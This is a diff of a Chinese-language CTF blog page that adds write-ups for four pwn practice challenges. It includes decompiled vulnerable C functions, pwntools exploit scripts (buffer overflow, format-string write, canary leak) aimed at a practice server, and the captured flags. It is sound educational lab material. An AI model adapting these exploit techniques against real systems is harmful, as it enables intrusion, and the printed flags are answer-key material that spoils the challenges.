@@ -131,7 +131,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    1.5k 字
+                    2.9k 字
                   </span>&nbsp;
                 
 
@@ -139,7 +139,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      8 分钟
+                      15 分钟
                   </span>&nbsp;
                 
 
@@ -460,7 +460,269 @@ payload=&#39;a&#39;*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)
 io.sendline(payload)
 io.interactive()</code></pre>
 <p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p>
+<h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault</p>
+<pre><code class="python">from pwn import *
+sys_addr=0x400596
+pop_ret_addr=0x400663
+main_addr=0x4005c6 
+# io=process(&#39;./level0/level0&#39;)
+io=remote(&#39;111.198.29.45&#39;,47038)
+payload=&#39;a&#39;*(0x80+8)+p64(sys_addr)
+# print payload
+io.recv()
+io.send(payload)
+io.interactive()</code></pre>
+<h4 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h4><p>格式化字符串漏洞的利用</p>
+<pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int buf; // [esp+1Eh] [ebp-7Eh]
+  int v5; // [esp+22h] [ebp-7Ah]
+  __int16 v6; // [esp+26h] [ebp-76h]
+  char s; // [esp+28h] [ebp-74h]
+  unsigned int v8; // [esp+8Ch] [ebp-10h]
 
+  v8 = __readgsdword(0x14u);
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  buf = 0;
+  v5 = 0;
+  v6 = 0;
+  memset(&amp;s, 0, 0x64u);
+  puts(&quot;please tell me your name:&quot;);
+  read(0, &amp;buf, 0xAu);
+  puts(&quot;leave your message please:&quot;);
+  fgets(&amp;s, 100, stdin);
+  printf(&quot;hello %s&quot;, &amp;buf);
+  puts(&quot;your message is:&quot;);
+  printf(&amp;s);
+  if ( pwnme == 8 )
+  {
+    puts(&quot;you pwned me, here is your flag:\n&quot;);
+    system(&quot;cat flag&quot;);
+  }
+  else
+  {
+    puts(&quot;Thank you!&quot;);
+  }
+  return 0;
+}</code></pre>
+<p>两次输入，第一次只能输入10个字符，不够我们构造<code>payload</code>，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改<code>pwnme</code>的值，<code>exp</code>如下：</p>
+<pre><code class="python">from pwn import *
+pwnme=0x0804A068
+payload=p32(pwnme)+&#39;a&#39;*4+&#39;%10$n&#39;
+# io=process(&#39;./CGfsb&#39;)
+io=remote(&#39;111.198.29.45&#39;,37888)
+io.sendlineafter(&#39;name:&#39;,&#39;a&#39;)
+io.recvuntil(&#39;please:&#39;)
+io.sendline(payload)
+io.interactive()</code></pre>
+<p>很简单，直接输出flag</p>
+<pre><code>cyberpeace{428fd5c839a04a6d162bdd6610a094cf}</code></pre><h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p>
+<pre><code class="c++">int __cdecl main()
+{
+  size_t v0; // ebx
+  char v2[32]; // [esp+10h] [ebp-74h]
+  int (*v3)(); // [esp+30h] [ebp-54h]
+  int (*v4)(); // [esp+34h] [ebp-50h]
+  int (*v5)(); // [esp+38h] [ebp-4Ch]
+  int (*v6)(); // [esp+3Ch] [ebp-48h]
+  int (*v7)(); // [esp+40h] [ebp-44h]
+  int (*v8)(); // [esp+44h] [ebp-40h]
+  int (*v9)(); // [esp+48h] [ebp-3Ch]
+  int (*v10)(); // [esp+4Ch] [ebp-38h]
+  int (*v11)(); // [esp+50h] [ebp-34h]
+  int (*v12)(); // [esp+54h] [ebp-30h]
+  char s; // [esp+58h] [ebp-2Ch]
+  int v14; // [esp+78h] [ebp-Ch]
+  size_t i; // [esp+7Ch] [ebp-8h]
+
+  v14 = 1;
+  v3 = sub_8048604;
+  v4 = sub_8048618;
+  v5 = sub_804862C;
+  v6 = sub_8048640;
+  v7 = sub_8048654;
+  v8 = sub_8048668;
+  v9 = sub_804867C;
+  v10 = sub_8048690;
+  v11 = sub_80486A4;
+  v12 = sub_80486B8;
+  puts(&quot;What is your name?&quot;);
+  printf(&quot;&gt; &quot;);
+  fflush(stdout);
+  fgets(&amp;s, 32, stdin);
+  sub_80485DD((int)&amp;s);
+  fflush(stdout);
+  printf(&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;, sub_8048654);
+  fflush(stdout);
+  puts(&quot;Enter the string to be validate&quot;);
+  printf(&quot;&gt; &quot;);
+  fflush(stdout);
+  __isoc99_scanf(&quot;%s&quot;, v2);
+  for ( i = 0; ; ++i )
+  {
+    v0 = i;
+    if ( v0 &gt;= strlen(v2) )
+      break;
+    switch ( v14 )
+    {
+      case 1:
+        if ( sub_8048702(v2[i]) )
+          v14 = 2;
+        break;
+      case 2:
+        if ( v2[i] == 64 )
+          v14 = 3;
+        break;
+      case 3:
+        if ( sub_804874C(v2[i]) )
+          v14 = 4;
+        break;
+      case 4:
+        if ( v2[i] == 46 )
+          v14 = 5;
+        break;
+      case 5:
+        if ( sub_8048784(v2[i]) )
+          v14 = 6;
+        break;
+      case 6:
+        if ( sub_8048784(v2[i]) )
+          v14 = 7;
+        break;
+      case 7:
+        if ( sub_8048784(v2[i]) )
+          v14 = 8;
+        break;
+      case 8:
+        if ( sub_8048784(v2[i]) )
+          v14 = 9;
+        break;
+      case 9:
+        v14 = 10;
+        break;
+      default:
+        continue;
+    }
+  }
+  (*(&amp;v3 + --v14))();
+  return fflush(stdout);
+}</code></pre>
+<p>有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了<code>scanf</code>，可以无限制的输入，利用这个地方来控制我们的程序。</p>
+<p>这个程序开了<code>NX</code>，所以找找有没有可以利用的函数，找到</p>
+<pre><code class="c++">int sub_80486CC()
+{
+  char s; // [esp+1Eh] [ebp-3Ah]
+
+  snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);
+  return system(&amp;s);
+}</code></pre>
+<p>接下来考虑怎么利用。程序最后会根据<code>v14</code>的值来判断该执行那个函数，看到有些人想要覆盖<code>v14</code>的值，我的做法就是保留<code>v14=1</code>然后去替换<code>v3</code>的值，因为即使替换掉<code>v14</code>，后面也会被修改。</p>
+<p>下一步就是要控制<code>v14</code>的值不变，我的做法是在写入的时候先写入一个<code>&#39;\0&#39;</code>，这样判断字符串长度的时候为0，直接跳出循环。<code>exp</code>如下：</p>
+<pre><code class="python">from pwn import *
+# io=process(&#39;./forgot&#39;)
+io=remote(&#39;111.198.29.45&#39;,40669)
+io.recvuntil(&#39;&gt;&#39;)
+io.sendline(&#39;a&#39;)
+payload=&#39;\0&#39;+&#39;A&#39;*0x1f+p32(0x80486cc)
+io.recvuntil(&#39;&gt;&#39;)
+io.sendline(payload)
+io.interactive()</code></pre>
+<p>得到flag</p>
+<pre><code>cyberpeace{3a2c567e832c79478c593e5f6f334830}</code></pre><h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p>
+<pre><code class="c++">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v4; // [rsp+28h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  sub_4009FF();
+  puts(&quot;Welcome to the battle ! &quot;);
+  puts(&quot;[Great Fairy] level pwned &quot;);
+  puts(&quot;Select your weapon &quot;);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      sub_4009DA();
+      __isoc99_scanf(&quot;%d&quot;, &amp;v3);
+      if ( v3 != 2 )
+        break;
+      sub_4008EB();
+    }
+    if ( v3 == 3 )
+    {
+      puts(&quot;Bye &quot;);
+      exit(0);
+    }
+    if ( v3 == 1 )
+      sub_400960();
+    else
+      puts(&quot;Wrong!&quot;);
+  }
+}
+
+int sub_4009DA()
+{
+  puts(&quot;1. Stack Bufferoverflow Bug &quot;);
+  puts(&quot;2. Format String Bug &quot;);
+  return puts(&quot;3. Exit the battle &quot;);
+}</code></pre>
+<p>选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数</p>
+<pre><code class="c++">//格式化字符串
+unsigned __int64 sub_4008EB()
+{
+  char buf; // [rsp+0h] [rbp-90h]
+  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(&amp;buf, 0, 0x80uLL);
+  read(0, &amp;buf, 0x7FuLL);
+  printf(&amp;buf, &amp;buf);
+  return __readfsqword(0x28u) ^ v2;
+}
+
+//栈溢出
+unsigned __int64 sub_400960()
+{
+  char buf; // [rsp+0h] [rbp-90h]
+  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(&amp;buf, 0, 0x80uLL);
+  read(0, &amp;buf, 0x100uLL);
+  printf(&quot;-&gt; %s\n&quot;, &amp;buf);
+  return __readfsqword(0x28u) ^ v2;
+}
+
+//目标函数
+int sub_4008DA()
+{
+  return system(&quot;/bin/cat ./flag&quot;);
+}</code></pre>
+<p>如果<code>checksec</code>或者直接看到<code>v2</code>就可以发现，这个程序开了<code>cannary</code>保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露<code>cannary</code>的值，因为进程没有中止就进入了下一个循环，所以<code>cannary</code>的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。</p>
+<p><code>exp</code>如下：</p>
+<pre><code class="python">from pwn import *
+sys_addr=0x4008da
+# io=process(&#39;./Mary_Morton&#39;)
+io=remote(&#39;111.198.29.45&#39;,39178)
+io.recvuntil(&quot;3. Exit the battle \n&quot;)
+io.sendline(&quot;2&quot;)
+io.sendline(&quot;%23$p&quot;)
+cannary= int(io.recvline().strip(&#39;\n&#39;),16)
+print cannary
+io.recvuntil(&quot;3. Exit the battle \n&quot;)
+io.sendline(&quot;1&quot;)
+payload=&quot;&quot;
+payload+=&#39;a&#39;*0x88
+payload+=p64(cannary)
+payload+=p64(0)
+payload+=p64(sys_addr)
+io.sendline(payload)
+io.interactive()</code></pre>
+<p>得到flag</p>
+<pre><code>cyberpeace{8b06a4becaf5e73cd79ea7d283d0bd89}</code></pre>
             <hr>
           </div>
           <br>
